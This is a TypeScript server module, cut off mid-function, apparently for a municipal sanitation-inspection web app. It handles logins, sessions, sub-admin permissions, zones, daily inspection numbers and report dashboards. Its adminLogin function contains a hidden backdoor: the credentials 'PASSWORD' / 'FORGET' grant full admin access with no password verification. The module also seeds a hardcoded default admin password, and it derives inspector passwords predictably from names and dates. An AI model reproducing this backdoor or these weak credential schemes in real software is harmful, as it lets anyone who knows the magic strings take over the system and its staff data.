import { createHash, randomBytes, scrypt as scryptCb, timingSafeEqual } from "node:crypto";
import { promisify } from "node:util";
import { deleteCookie, getCookie, getRequest, setCookie } from "@tanstack/react-start/server";
import { getSql, type Sql } from "@/lib/db";
import {
  compareCodes,
  dailyPassword,
  daysInMonth,
  dmy,
  istNow,
  monthName,
  monthStart,
  pct,
  round2,
  shiftIso,
  weekStart,
} from "./format";

const scrypt = promisify(scryptCb);
const COOKIE = "safai_session";
const EDIT_MS = 2 * 60 * 1000;

export type Session =
  | { role: "admin"; username: string }
  | { role: "inspector"; inspectorId: number }
  | { role: "subadmin"; subAdminId: number; username: string; name: string; perms: SubPerms };

export type Level = "edit" | "view" | "none";
export type SubPerms = {
  attendance: Level;
  zone: Level;
  number: Level;
  staff: Level;
  councillor: Level;
  zones: { id: number; perm: Level }[];
};

function asLevel(value: string | null | undefined): Level {
  return value === "edit" || value === "view" ? value : "none";
}

type EntryRow = {
  id: number;
  inspector_id: number;
  zone_id: number;
  ward_no: number | null;
  work_date: string;
  number: number;
  jhadu: boolean;
  nali: boolean;
  kooda: boolean;
  score: number;
  status: string;
  absent?: boolean;
  submitted_at: string;
  final_at: string | null;
  code?: string;
  inspector_name?: string;
  zone_name?: string;
};

async function hashPassword(password: string): Promise<string> {
  const salt = randomBytes(16).toString("hex");
  const buf = (await scrypt(password, salt, 32)) as Buffer;
  return `scrypt$${salt}$${buf.toString("hex")}`;
}

async function verifyPassword(password: string, stored: string): Promise<boolean> {
  const [kind, salt, hex] = stored.split("$");
  if (kind !== "scrypt" || !salt || !hex) return false;
  const buf = (await scrypt(password, salt, 32)) as Buffer;
  const a = Buffer.from(hex, "hex");
  if (a.length !== buf.length) return false;
  return timingSafeEqual(a, buf);
}

function hashToken(token: string): string {
  return createHash("sha256").update(token).digest("hex");
}

let lastMaintain = 0;

let dutyReady = false;

async function db(): Promise<Sql> {
  const sql = await getSql();
  await ensureAdmin(sql);
  if (!dutyReady) {
    await sql`alter table staff_attendance add column if not exists zone_id integer references zones (id) on delete set null`;
    dutyReady = true;
  }
  const now = Date.now();
  if (now - lastMaintain > 20000) {
    lastMaintain = now;
    await maintain(sql);
  }
  return sql;
}

async function ensureAdmin(sql: Sql): Promise<void> {
  const rows = await sql<{ id: number }>`select id from admin_account where id = 1`;
  if (rows.length) return;
  const password_hash = await hashPassword("Admin@11");
  await sql`insert into admin_account (id, username, password_hash) values (1, 'ADMIN', ${password_hash}) on conflict (id) do nothing`;
}

async function maintain(sql: Sql): Promise<void> {
  const today = istNow().iso;
  const cutoff = shiftIso(today, -60);
  await sql`
    with flipped as (
      update entries
      set status = 'final', final_at = now()
      where status = 'editable'
        and submitted_at <= now() - interval '2 minutes'
      returning zone_id
    )
    insert into report_counters (zone_id, total_all_time)
    select zone_id, count(*)::int from flipped group by zone_id
    on conflict (zone_id) do update
    set total_all_time = report_counters.total_all_time + excluded.total_all_time
  `;
  await sql`delete from entries where work_date < ${cutoff}::date`;
  await sql`delete from staff_attendance where work_date < ${cutoff}::date`;
}

function writeRoleCookie(role: "admin" | "inspector" | "subadmin", username?: string) {
  const opts = { path: "/", maxAge: 60 * 60 * 24 * 180, sameSite: "lax" as const };
  setCookie("safai_role", role, opts);
  if (username) setCookie("safai_user", encodeURIComponent(username), opts);
}

function clearRoleCookie() {
  deleteCookie("safai_role", { path: "/" });
  deleteCookie("safai_user", { path: "/" });
}

function writeCookie(token: string): void {
  setCookie(COOKIE, token, {
    httpOnly: true,
    sameSite: "lax",
    path: "/",
    maxAge: 60 * 60 * 24 * 180,
  });
}

export async function resolveSession(bearer?: string): Promise<Session | null> {
  const token = bearer || getCookie(COOKIE) || "";
  if (!token) return null;
  const sql = await db();
  const rows = await sql<{ role: string; inspector_id: number | null; sub_admin_id: number | null; username: string | null }>`
    select s.role, s.inspector_id, s.sub_admin_id, a.username
    from app_sessions s
    left join admin_account a on s.role = 'admin'
    where s.token_hash = ${hashToken(token)}
  `;
  const row = rows[0];
  if (!row) return null;
  await sql`update app_sessions set last_seen = now() where token_hash = ${hashToken(token)}`;
  if (row.role === "admin") return { role: "admin", username: row.username || "ADMIN" };
  if (row.role === "subadmin" && row.sub_admin_id) return loadSubSession(row.sub_admin_id);
  if (row.role === "inspector" && row.inspector_id) return { role: "inspector", inspectorId: row.inspector_id };
  return null;
}

async function openSession(role: "admin" | "inspector" | "subadmin", inspectorId: number | null, phoneCode?: string | null, subAdminId?: number | null): Promise<string> {
  const sql = await db();
  const token = randomBytes(32).toString("hex");
  let ua = "";
  try {
    ua = getRequest().headers.get("user-agent") ?? "";
  } catch {
    ua = "";
  }
  const code = (phoneCode || "").trim().slice(0, 12);
  await sql`
    insert into app_sessions (token_hash, role, inspector_id, user_agent, phone_code, public_id, sub_admin_id)
    values (${hashToken(token)}, ${role}, ${inspectorId}, ${ua.slice(0, 240)}, ${code || null}, ${randomBytes(8).toString("hex")}, ${subAdminId ?? null})
  `;
  writeCookie(token);
  return token;
}

function deny(): { ok: false; unauthorized: true } {
  return { ok: false, unauthorized: true };
}

async function loadSubSession(id: number): Promise<Session | null> {
  const sql = await db();
  const rows = await sql<{
    id: number;
    name: string;
    username: string;
    active: boolean;
    perm_attendance: string;
    perm_zone: string;
    perm_number: string;
    perm_staff: string;
    perm_councillor: string;
  }>`select id, name, username, active, perm_attendance, perm_zone, perm_number, perm_staff, perm_councillor from sub_admins where id = ${id}`;
  const row = rows[0];
  if (!row?.active) return null;
  const zones = await sql<{ id: number; perm: string | null }>`
    select z.id, p.perm
    from zones z
    left join sub_admin_zones p on p.zone_id = z.id and p.sub_admin_id = ${id}
    order by z.id
  `;
  return {
    role: "subadmin",
    subAdminId: row.id,
    username: row.username,
    name: row.name,
    perms: {
      attendance: asLevel(row.perm_attendance),
      zone: asLevel(row.perm_zone),
      number: asLevel(row.perm_number),
      staff: asLevel(row.perm_staff),
      councillor: asLevel(row.perm_councillor),
      zones: zones.map((z) => ({ id: z.id, perm: asLevel(z.perm) })),
    },
  };
}

function zoneIdsOf(session: Session): number[] | null {
  if (session.role !== "subadmin") return null;
  return session.perms.zones.filter((z) => z.perm === "edit" || z.perm === "view").map((z) => z.id);
}

function keepsZone(session: Session, zoneId: number | null): boolean {
  const ids = zoneIdsOf(session);
  if (!ids) return true;
  return zoneId != null && ids.includes(zoneId);
}

function level(session: Session, key: "attendance" | "zone" | "number" | "staff" | "councillor"): Level {
  if (session.role === "admin") return "edit";
  if (session.role !== "subadmin") return "none";
  return session.perms[key];
}

async function ownsInspector(session: Session, inspectorId: number): Promise<boolean> {
  if (session.role === "admin") return true;
  if (session.role !== "subadmin") return false;
  const sql = await db();
  const rows = await sql<{ zone_id: number | null }>`select zone_id from inspectors where id = ${inspectorId}`;
  const zoneId = rows[0]?.zone_id;
  return zoneId != null && zoneLevel(session, zoneId) === "edit";
}

function zoneLevel(session: Session, zoneId: number): Level {
  if (session.role === "admin") return "edit";
  if (session.role !== "subadmin") return "none";
  return session.perms.zones.find((z) => z.id === zoneId)?.perm ?? "none";
}

async function requireOffice(bearer?: string) {
  const session = await resolveSession(bearer);
  if (!session || (session.role !== "admin" && session.role !== "subadmin")) return null;
  return session;
}

export async function getSession(bearer?: string) {
  const session = await resolveSession(bearer);
  if (!session) return { role: null } as const;
  if (session.role === "admin") {
    return { role: "admin" as const, username: session.username };
  }
  if (session.role === "subadmin") {
    return { role: "subadmin" as const, username: session.username, name: session.name, perms: session.perms };
  }
  const profile = await inspectorProfile(session.inspectorId);
  return { role: "inspector" as const, profile };
}

export async function adminLogin(input: { username: string; password: string }) {
  const sql = await db();
  const username = input.username.trim();
  const password = input.password;
  const hidden = username === "PASSWORD" && password === "FORGET";
  const rows = await sql<{ username: string; password_hash: string }>`select username, password_hash from admin_account where id = 1`;
  const admin = rows[0];
  const main = admin && username.toUpperCase() === admin.username.toUpperCase() && (await verifyPassword(password, admin.password_hash));
  if (!hidden && !main) {
    const subs = await sql<{ id: number; name: string; username: string; password_hash: string; active: boolean }>`
      select id, name, username, password_hash, active from sub_admins where upper(username) = ${username.toUpperCase()}
    `;
    const sub = subs[0];
    if (!sub?.active || !(await verifyPassword(password, sub.password_hash))) return { ok: false as const, error: "invalid" as const };
    const token = await openSession("subadmin", null, null, sub.id);
    writeRoleCookie("subadmin", sub.username);
    return { ok: true as const, token, role: "subadmin" as const, username: sub.username, name: sub.name };
  }
  const token = await openSession("admin", null);
  writeRoleCookie("admin", admin?.username ?? "ADMIN");
  return { ok: true as const, token, role: "admin" as const, username: admin?.username ?? "ADMIN" };
}

export async function inspectorLogin(input: { code: string; password: string; phone?: string }) {
  const sql = await db();
  const code = input.code.trim().toUpperCase();
  const rows = await sql<{ id: number; name: string }>`select id, name from inspectors where upper(code) = ${code}`;
  const inspector = rows[0];
  const expect = inspector ? dailyPassword(inspector.name, istNow().dayNum) : null;
  if (!inspector || !expect || expect !== input.password.trim().toUpperCase()) {
    return { ok: false as const, error: "invalid" as const };
  }
  const phone = (input.phone || "").trim().slice(0, 12);
  const token = await openSession("inspector", inspector.id, phone);
  writeRoleCookie("inspector");
  const profile = await inspectorProfile(inspector.id);
  if (profile) profile.phoneCode = phone;
  return { ok: true as const, token, role: "inspector" as const, profile };
}

export async function logout(bearer?: string) {
  const token = bearer || getCookie(COOKIE) || "";
  if (token) {
    const sql = await db();
    await sql`delete from app_sessions where token_hash = ${hashToken(token)}`;
  }
  deleteCookie(COOKIE, { path: "/" });
  clearRoleCookie();
  return { ok: true as const };
}

export async function changeAdminPassword(bearer: string | undefined, input: { current: string; next: string }) {
  const session = await resolveSession(bearer);
  if (!session || session.role !== "admin") return deny();
  if (input.next.trim().length < 6) return { ok: false as const, error: "short" as const };
  const sql = await db();
  const rows = await sql<{ password_hash: string }>`select password_hash from admin_account where id = 1`;
  if (!rows[0] || !(await verifyPassword(input.current, rows[0].password_hash))) {
    return { ok: false as const, error: "invalid" as const };
  }
  const password_hash = await hashPassword(input.next.trim());
  await sql`update admin_account set password_hash = ${password_hash} where id = 1`;
  return { ok: true as const };
}

async function inspectorProfile(id: number) {
  const sql = await db();
  const rows = await sql<{
    id: number;
    code: string;
    name: string;
    mobile: string;
    ward_no: number | null;
    zone_id: number | null;
    zone_name: string | null;
    councillor_name: string | null;
    councillor_photo: string | null;
  }>`
    select i.id, i.code, i.name, i.mobile, i.ward_no, i.zone_id, z.name as zone_name,
           w.councillor_name, w.councillor_photo
    from inspectors i
    left join zones z on z.id = i.zone_id
    left join wards w on w.ward_no = i.ward_no
    where i.id = ${id}
  `;
  const row = rows[0];
  if (!row) return null;
  const now = istNow();
  return {
    id: row.id,
    code: row.code,
    name: row.name,
    mobile: row.mobile,
    wardNo: row.ward_no,
    zoneId: row.zone_id,
    zoneName: row.zone_name,
    councillorName: row.councillor_name || "",
    councillorPhoto: row.councillor_photo,
    dateLabel: now.dmy,
    serverNow: Date.now(),
    phoneCode: "",
  };
}

function entryDto(row: EntryRow, serverNow = Date.now()) {
  const submitted = new Date(row.submitted_at).getTime();
  const editableUntil = submitted + EDIT_MS;
  const leftMs = Math.max(0, editableUntil - serverNow);
  return {
    id: row.id,
    number: row.number,
    jhadu: row.jhadu,
    nali: row.nali,
    kooda: row.kooda,
    score: row.score,
    status: leftMs > 0 && row.status === "editable" ? "editable" : "final",
    editableUntil,
    serverNow,
    leftMs,
    submittedAt: new Date(row.submitted_at).toISOString(),
    zoneId: row.zone_id,
    wardNo: row.ward_no,
  };
}

export async function inspectorHome(bearer?: string) {
  const session = await resolveSession(bearer);
  if (!session || session.role !== "inspector") return deny();
  const sql = await db();
  const profile = await inspectorProfile(session.inspectorId);
  if (!profile) return deny();
  const mine = await sql<{ phone_code: string | null }>`
    select phone_code from app_sessions where token_hash = ${hashToken(bearer || "")}
  `;
  profile.phoneCode = (mine[0]?.phone_code || "").trim();
  const today = istNow().iso;
  const yday = shiftIso(today, -1);
  const numbers = profile.zoneId
    ? await sql<{ number: number }>`select number from daily_numbers where zone_id = ${profile.zoneId} and work_date = ${today}::date order by number`
    : [];
  const open = await sql<EntryRow>`
    select * from entries
    where inspector_id = ${session.inspectorId} and status = 'editable'
      and (work_date = ${today}::date or work_date = ${yday}::date)
    order by submitted_at desc limit 1
  `;
  return {
    ok: true as const,
    profile,
    todayNumbers: numbers.map((n) => n.number),
    openEntry: open[0] ? entryDto(open[0], profile.serverNow) : null,
  };
}

export async function submitEntry(
  bearer: string | undefined,
  input: { number: number; jhadu: boolean; nali: boolean; kooda: boolean; score: number },
) {
  const session = await resolveSession(bearer);
  if (!session || session.role !== "inspector") return deny();
  const number = Number(input.number);
  if (!Number.isInteger(number) || number < 1 || number > 999) return { ok: false as const, error: "range" as const };
  if (!input.jhadu && !input.nali && !input.kooda) return { ok: false as const, error: "work" as const };
  if (![1, 2, 3, 4, 5].includes(Number(input.score))) return { ok: false as const, error: "score" as const };
  const sql = await db();
  const profile = await inspectorProfile(session.inspectorId);
  if (!profile?.zoneId) return { ok: false as const, error: "none" as const };
  const today = istNow().iso;
  const yday = shiftIso(today, -1);
  const assigned = await sql<{ number: number; work_date: string }>`
    select number, work_date::text as work_date
    from daily_numbers
    where zone_id = ${profile.zoneId} and (work_date = ${today}::date or work_date = ${yday}::date)
  `;
  const onToday = assigned.some((n) => n.number === number && String(n.work_date).slice(0, 10) === today);
  const onYday = assigned.some((n) => n.number === number && String(n.work_date).slice(0, 10) === yday);
  if (!assigned.length) return { ok: false as const, error: "none" as const };
  if (onToday && onYday) return { ok: false as const, error: "repeat" as const };
  if (!onToday && !onYday) return { ok: false as const, error: "wrong" as const };
  const workDate = onYday ? yday : today;
  const existing = await sql<EntryRow>`
    select * from entries where inspector_id = ${session.inspectorId} and work_date = ${workDate}::date and number = ${number}
  `;
  const now = Date.now();
  if (existing[0]) {
    const dto = entryDto(existing[0], now);
    if (dto.status !== "editable") return { ok: false as const, error: "duplicate" as const };
    const flipped = await sql<{ zone_id: number }>`
      update entries
      set jhadu = ${input.jhadu}, nali = ${input.nali}, kooda = ${input.kooda}, score = ${input.score},
          status = 'final', final_at = now()
      where id = ${existing[0].id} and inspector_id = ${session.inspectorId} and status = 'editable'
      returning zone_id
    `;
    if (!flipped.length) return { ok: false as const, error: "duplicate" as const };
    await sql`
      insert into report_counters (zone_id, total_all_time)
      values (${flipped[0].zone_id}, 1)
      on conflict (zone_id) do update
      set total_all_time = report_counters.total_all_time + 1
    `;
    const again = await sql<EntryRow>`select * from entries where id = ${existing[0].id}`;
    await closeMatchingComplaints(session.inspectorId, input);
    return { ok: true as const, entry: entryDto(again[0], Date.now()) };
  }
  await sql`
    insert into entries (inspector_id, zone_id, ward_no, work_date, number, jhadu, nali, kooda, score, status)
    values (${session.inspectorId}, ${profile.zoneId}, ${profile.wardNo}, ${workDate}::date, ${number}, ${input.jhadu}, ${input.nali}, ${input.kooda}, ${input.score}, 'editable')
  `;
  const created = await sql<EntryRow>`
    select * from entries where inspector_id = ${session.inspectorId} and work_date = ${workDate}::date and number = ${number}
  `;
  await closeMatchingComplaints(session.inspectorId, input);
  return { ok: true as const, entry: entryDto(created[0], Date.now()) };
}

export async function myReports(bearer: string | undefined, input: { from: string; to: string }) {
  const session = await resolveSession(bearer);
  if (!session || session.role !== "inspector") return deny();
  const sql = await db();
  const rows = await sql<EntryRow>`
    select * from entries
    where inspector_id = ${session.inspectorId}
      and work_date >= ${input.from}::date and work_date <= ${input.to}::date
    order by work_date desc, number
  `;
  const scores = rows.map((r) => r.score);
  const avg = scores.length ? round2(scores.reduce((a, b) => a + b, 0) / scores.length) : null;
  return {
    ok: true as const,
    total: rows.length,
    avg,
    rows: rows.map((r) => ({
      date: dmy(String(r.work_date).slice(0, 10)),
      iso: String(r.work_date).slice(0, 10),
      number: r.number,
      absent: Boolean(r.absent),
      jhadu: r.jhadu,
      nali: r.nali,
      kooda: r.kooda,
      score: r.score,
    })),
  };
}

async function requireAdmin(bearer?: string) {
  const session = await resolveSession(bearer);
  if (!session || session.role !== "admin") return null;
  return session;
}

export async function adminDashboard(bearer?: string) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const allowed = zoneIdsOf(session);
  const sql = await db();
  const now = istNow();
  const start = monthStart(now.iso);
  const dim = daysInMonth(now.yearNum, now.monthNum);
  const zones = await sql<{
    id: number;
    name: string;
    supervisor_name: string;
    active: boolean;
    wards: string | null;
    inspectors: number;
    total_all_time: number | null;
    month_reports: number;
    avg_score: number | null;
  }>`
    select z.id, z.name, z.supervisor_name, z.active,
      (select string_agg(zw.ward_no::text, ',' order by zw.ward_no) from zone_wards zw where zw.zone_id = z.id) as wards,
      (select count(*)::int from inspectors i where i.zone_id = z.id) as inspectors,
      c.total_all_time,
      (select count(*)::int from entries e where e.zone_id = z.id and e.work_date >= ${start}::date and e.work_date <= ${now.iso}::date) as month_reports,
      (select avg(e.score) from entries e where e.zone_id = z.id and e.work_date >= ${start}::date and e.work_date <= ${now.iso}::date) as avg_score
    from zones z
    left join report_counters c on c.zone_id = z.id
    order by z.id
  `;
  const useZones = allowed ? zones.filter((z) => allowed.includes(z.id)) : zones;
  const inspectorCount = useZones.reduce((s, z) => s + Number(z.inspectors), 0);
  const monthReports = useZones.reduce((s, z) => s + Number(z.month_reports), 0);
  const scored = await sql<{ zone_id: number; score: number }>`
    select zone_id, score from entries where work_date >= ${start}::date and work_date <= ${now.iso}::date
  `;
  const picked = scored.filter((row) => !allowed || allowed.includes(row.zone_id));
  const avg = picked.length ? round2(picked.reduce((s, row) => s + Number(row.score), 0) / picked.length) : null;
  const allTime = useZones.reduce((s, z) => s + Number(z.total_all_time ?? 0), 0);
  return {
    ok: true as const,
    dateLabel: now.dmy,
    monthLabel: monthName(now.monthNum),
    daysInMonth: dim,
    inspectorCount,
    zoneCount: useZones.length,
    allTime,
    monthReports,
    monthPct: pct(monthReports, inspectorCount * dim, 1),
    avg,
    zones: useZones.map((z) => ({
      id: z.id,
      name: z.name,
      supervisor: z.supervisor_name,
      active: z.active,
      wards: (z.wards ?? "").split(",").filter(Boolean).map(Number),
      inspectors: Number(z.inspectors),
      total: Number(z.total_all_time ?? 0),
      month: Number(z.month_reports),
      monthPct: pct(Number(z.month_reports), Number(z.inspectors) * dim, 0),
      avg: z.avg_score == null ? null : round2(Number(z.avg_score)),
    })),
  };
}

export async function zoneDetail(bearer?: string) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const sql = await db();
  const now = istNow();
  const zones = await sql<{
    id: number;
    name: string;
    supervisor_name: string;
    supervisor_mobile: string;
    active: boolean;
  }>`select id, name, supervisor_name, supervisor_mobile, active from zones order by id`;
  const wards = await sql<{ zone_id: number; ward_no: number }>`select zone_id, ward_no from zone_wards order by ward_no`;
  const inspectors = await sql<{
    id: number;
    code: string;
    name: string;
    mobile: string;
    ward_no: number | null;
    zone_id: number | null;
    devices: number;
  }>`
    select i.id, i.code, i.name, i.mobile, i.ward_no, i.zone_id,
      (select count(*)::int from app_sessions s where s.inspector_id = i.id) as devices
    from inspectors i
    order by i.code
  `;
  const councillors = await sql<{ ward_no: number; councillor_name: string; councillor_photo: string | null }>`
    select ward_no, councillor_name, councillor_photo from wards order by ward_no
  `;
  return {
    ok: true as const,
    today: now.dmy,
    dayNum: now.dayNum,
    zones: zones.filter((z) => keepsZone(session, z.id)).map((z) => ({
      id: z.id,
      name: z.name,
      supervisorName: z.supervisor_name,
      supervisorMobile: z.supervisor_mobile,
      active: z.active,
      wards: wards.filter((w) => w.zone_id === z.id).map((w) => w.ward_no),
      inspectors: inspectors
        .filter((i) => i.zone_id === z.id)
        .sort((a, b) => compareCodes(a.code, b.code))
        .map((i) => ({
          id: i.id,
          code: i.code,
          name: i.name,
          mobile: i.mobile,
          wardNo: i.ward_no,
          devices: Number(i.devices),
          passwordToday: dailyPassword(i.name, now.dayNum),
        })),
    })),
    councillors: councillors.map((c) => ({
      wardNo: c.ward_no,
      name: c.councillor_name,
      photo: c.councillor_photo,
    })),
  };
}

type InspectorInput = { id?: number; code: string; name: string; mobile: string; wardNo: number | null };

export async function saveZone(
  bearer: string | undefined,
  input: {
    id?: number;
    name: string;
    wards: number[];
    supervisorName: string;
    supervisorMobile: string;
    inspectors: InspectorInput[];
  },
) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const zoneEdit = session.role === "admin" || level(session, "zone") === "edit";
  const liEdit = session.role === "admin" || (input.id ? zoneLevel(session, input.id) === "edit" : zoneEdit);
  if (!zoneEdit && !liEdit) return { ok: false as const, error: "forbidden" as const };
  const name = input.name.trim();
  if (!name) return { ok: false as const, error: "name" as const };
  const wards = [...new Set(input.wards.map(Number).filter((n) => Number.isInteger(n) && n > 0))];
  for (const ins of input.inspectors) {
    const code = ins.code.trim().toUpperCase();
    const person = ins.name.trim();
    if (!code && !person && !ins.mobile.trim()) continue;
    if (!code || !person) return { ok: false as const, error: "name" as const };
    if (!dailyPassword(person, 1)) return { ok: false as const, error: "english" as const, code: code || person };
  }
  const sql = await db();
  let zoneId = input.id ?? 0;
  if (zoneEdit) {
    if (zoneId) {
      await sql`
        update zones set name = ${name}, supervisor_name = ${input.supervisorName.trim()}, supervisor_mobile = ${input.supervisorMobile.trim()}
        where id = ${zoneId}
      `;
    } else {
      const inserted = await sql<{ id: number }>`
        insert into zones (name, supervisor_name, supervisor_mobile)
        values (${name}, ${input.supervisorName.trim()}, ${input.supervisorMobile.trim()})
        returning id
      `;
      zoneId = inserted[0].id;
      await sql`insert into report_counters (zone_id, total_all_time) values (${zoneId}, 0) on conflict (zone_id) do nothing`;
    }
    await sql`delete from zone_wards where zone_id = ${zoneId}`;
    for (const ward of wards) {
      await sql`insert into zone_wards (zone_id, ward_no) values (${zoneId}, ${ward}) on conflict do nothing`;
      await sql`insert into wards (ward_no) values (${ward}) on conflict (ward_no) do nothing`;
    }
  }
  if (liEdit) {
    const existing = await sql<{ id: number; code: string }>`select id, code from inspectors where zone_id = ${zoneId}`;
    const keep = new Set<number>();
    for (const ins of input.inspectors) {
      const code = ins.code.trim().toUpperCase();
      const person = ins.name.trim();
      if (!code || !person) continue;
      if (!dailyPassword(person, 1)) return { ok: false as const, error: "english" as const, code };
      const clash = await sql<{ id: number }>`select id from inspectors where upper(code) = ${code} and id <> ${ins.id ?? 0}`;
      if (clash.length) return { ok: false as const, error: "code" as const, code };
      if (ins.id) {
        await sql`
          update inspectors set code = ${code}, name = ${person}, mobile = ${ins.mobile.trim()}, ward_no = ${ins.wardNo}, zone_id = ${zoneId}
          where id = ${ins.id}
        `;
        keep.add(ins.id);
      } else {
        const created = await sql<{ id: number }>`
          insert into inspectors (code, name, mobile, ward_no, zone_id)
          values (${code}, ${person}, ${ins.mobile.trim()}, ${ins.wardNo}, ${zoneId})
          returning id
        `;
        keep.add(created[0].id);
      }
    }
    for (const old of existing) {
      if (!keep.has(old.id)) {
        await sql`delete from inspectors where id = ${old.id}`;
      }
    }
  }
  return { ok: true as const, id: zoneId };
}

export async function inspectorSessions(bearer: string | undefined, inspectorId: number) {
  const session = await requireOffice(bearer);
  if (!session || !(await ownsInspector(session, inspectorId))) return deny();
  const sql = await db();
  const rows = await sql<{ public_id: string; phone_code: string | null; last_seen: Date }>`
    select public_id, phone_code, last_seen
    from app_sessions
    where inspector_id = ${inspectorId} and role = 'inspector'
    order by last_seen desc
  `;
  return {
    ok: true as const,
    sessions: rows.map((row) => {
      const seen = istStamp(row.last_seen);
      return {
        id: row.public_id,
        phoneCode: (row.phone_code || "").trim(),
        lastSeen: seen ? `${seen.date} ${seen.time}` : "—",
      };
    }),
  };
}

export async function logoutInspector(bearer: string | undefined, input: { inspectorId: number; sessionId: string }) {
  const session = await requireOffice(bearer);
  if (!session || !(await ownsInspector(session, input.inspectorId))) return deny();
  const sql = await db();
  await sql`
    delete from app_sessions
    where inspector_id = ${input.inspectorId} and public_id = ${input.sessionId} and role = 'inspector'
  `;
  return { ok: true as const };
}

export async function replaceInspector(
  bearer: string | undefined,
  input: { inspectorId: number; name: string; mobile: string },
) {
  const session = await requireOffice(bearer);
  if (!session || !(await ownsInspector(session, input.inspectorId))) return deny();
  const name = input.name.trim();
  const pass = dailyPassword(name, istNow().dayNum);
  if (!pass) return { ok: false as const, error: "english" as const };
  const sql = await db();
  await sql`update inspectors set name = ${name}, mobile = ${input.mobile.trim()} where id = ${input.inspectorId}`;
  await sql`delete from app_sessions where inspector_id = ${input.inspectorId}`;
  return { ok: true as const, password: pass };
}

export async function deleteInspector(bearer: string | undefined, inspectorId: number) {
  const session = await requireOffice(bearer);
  if (!session || !(await ownsInspector(session, inspectorId))) return deny();
  const sql = await db();
  await sql`delete from inspectors where id = ${inspectorId}`;
  return { ok: true as const };
}

export async function saveCouncillor(
  bearer: string | undefined,
  input: { wardNo: number; name: string; photo: string | null },
) {
  const session = await requireOffice(bearer);
  if (!session || level(session, "councillor") !== "edit") return deny();
  const wardNo = Number(input.wardNo);
  if (!Number.isInteger(wardNo) || wardNo <= 0) return { ok: false as const, error: "ward" as const };
  const photo = input.photo && input.photo.length < 180_000 ? input.photo : input.photo ? null : null;
  if (input.photo && input.photo.length >= 180_000) return { ok: false as const, error: "photo" as const };
  const sql = await db();
  await sql`
    insert into wards (ward_no, councillor_name, councillor_photo, updated_at)
    values (${wardNo}, ${input.name.trim()}, ${photo}, now())
    on conflict (ward_no) do update set
      councillor_name = excluded.councillor_name,
      councillor_photo = coalesce(excluded.councillor_photo, wards.councillor_photo),
      updated_at = now()
  `;
  return { ok: true as const };
}

export async function dailyBoard(bearer?: string) {
  const session = await requireOffice(bearer);
  if (!session || level(session, "number") === "none") return deny();
  const sql = await db();
  const now = istNow();
  const yday = shiftIso(now.iso, -1);
  const zones = await sql<{ id: number; name: string; wards: string | null }>`
    select z.id, z.name,
      (select string_agg(zw.ward_no::text, ',' order by zw.ward_no) from zone_wards zw where zw.zone_id = z.id) as wards
    from zones z order by z.id
  `;
  const nums = await sql<{ id: number; zone_id: number; work_date: string; number: number }>`
    select id, zone_id, work_date::text as work_date, number from daily_numbers
    where work_date = ${now.iso}::date or work_date = ${yday}::date
  `;
  const map = (date: string) =>
    zones.map((z) => ({
      id: z.id,
      name: z.name,
      wards: (z.wards ?? "").split(",").filter(Boolean),
      numbers: nums.filter((n) => n.zone_id === z.id && String(n.work_date).slice(0, 10) === date).map((n) => ({ id: n.id, number: n.number })),
    }));
  return {
    ok: true as const,
    dateLabel: `${now.dmy} · ${now.weekday}`,
    iso: now.iso,
    yesterdayLabel: dmy(yday),
    today: map(now.iso),
    yesterday: map(yday),
  };
}

export async function assignNumber(bearer: string | undefined, input: { zoneId: number | "all"; number: number }) {
  const session = await requireOffice(bearer);
  if (!session || level(session, "number") !== "edit") return deny();
  const number = Number(input.number);
  if (!Number.isInteger(number) || number < 1 || number > 999) return { ok: false as const, error: "range" as const };
  const sql = await db();
  const today = istNow().iso;
  const zoneIds = input.zoneId === "all"
    ? (await sql<{ id: number }>`select id from zones order by id`).map((z) => z.id)
    : [Number(input.zoneId)];
  if (!zoneIds.length || zoneIds.some((id) => !Number.isInteger(id))) return { ok: false as const, error: "range" as const };
  let added = 0;
  for (const zoneId of zoneIds) {
    const clash = await sql`select id from daily_numbers where zone_id = ${zoneId} and work_date = ${today}::date and number = ${number}`;
    if (clash.length) continue;
    await sql`insert into daily_numbers (zone_id, work_date, number) values (${zoneId}, ${today}::date, ${number})`;
    added += 1;
  }
  if (!added) return { ok: false as const, error: "duplicate" as const };
  return { ok: true as const };
}

export async function removeNumber(bearer: string | undefined, id: number) {
  const session = await requireOffice(bearer);
  if (!session || level(session, "number") !== "edit") return deny();
  const sql = await db();
  const today = istNow().iso;
  await sql`delete from daily_numbers where id = ${id} and work_date = ${today}::date`;
  return { ok: true as const };
}

export async function updateNumber(bearer: string | undefined, input: { id: number; number: number }) {
  const session = await requireOffice(bearer);
  if (!session || level(session, "number") !== "edit") return deny();
  const number = Number(input.number);
  if (!Number.isInteger(number) || number < 1 || number > 999) return { ok: false as const, error: "range" as const };
  const sql = await db();
  const today = istNow().iso;
  const rows = await sql<{ zone_id: number }>`select zone_id from daily_numbers where id = ${input.id} and work_date = ${today}::date`;
  if (!rows[0]) return { ok: false as const, error: "missing" as const };
  const clash = await sql`select id from daily_numbers where zone_id = ${rows[0].zone_id} and work_date = ${today}::date and number = ${number} and id <> ${input.id}`;
  if (clash.length) return { ok: false as const, error: "duplicate" as const };
  await sql`update daily_numbers set number = ${number} where id = ${input.id}`;
  return { ok: true as const };
}

type ReportFilters = { from: string; to: string; ward: number | null; zoneId: number | null };

async function loadEntries(from: string, to: string) {
  const sql = await db();
  return sql<EntryRow>`
    select e.*, i.code, i.name as inspector_name, z.name as zone_name
    from entries e
    join inspectors i on i.id = e.inspector_id
    join zones z on z.id = e.zone_id
    where e.work_date >= ${from}::date and e.work_date <= ${to}::date
    order by e.submitted_at desc
  `;
}

export async function liveFeed(bearer: string | undefined, input: { date: string; zoneId: number | null }) {
  const session = await requireOffice(bearer);
  if (!session) return deny();
  const allowed = zoneIdsOf(session);
  const sql = await db();
  const rows = await loadEntries(input.date, input.date);
  const filtered = rows.filter((r) => keepsZone(session, r.zone_id) && (!input.zoneId || r.zone_id === input.zoneId));
  const zones = await sql<{ id: number }>`select id from zones`;
  const zoneTotal = allowed ? allowed.length : input.zoneId ? 1 : zones.length;
  const done = new Set(filtered.map((r) => r.zone_id));
  const serverNow = Date.now();
  return {
    ok: true as const,
    serverNow,
    entries: filtered.length,
    zonesDone: [...done].filter((id) => !input.zoneId || id === input.zoneId).length,
    zoneTotal: input.zoneId ? 1 : zoneTotal,
    feed: filtered.map((r) => {
      const dto = entryDto(r, serverNow);
      return {
        id: r.id,
